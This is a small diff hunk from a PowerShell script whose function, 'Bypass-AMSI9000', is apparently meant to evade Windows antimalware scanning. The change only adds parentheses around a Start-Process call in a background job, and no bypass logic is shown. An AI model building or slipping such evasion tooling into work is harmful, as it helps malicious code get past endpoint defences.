@@ -23,7 +23,7 @@ function Bypass-AMSI9000 {
 	}
 	Try {
 		
-		Start-Job -Name "foo" -ScriptBlock {Start-Process -NoNewWindow powershell} | Out-Null
+		Start-Job -Name "foo" -ScriptBlock {(Start-Process -NoNewWindow powershell)} | Out-Null
 		
 		Write-Output "Working..."
 		sleep 3
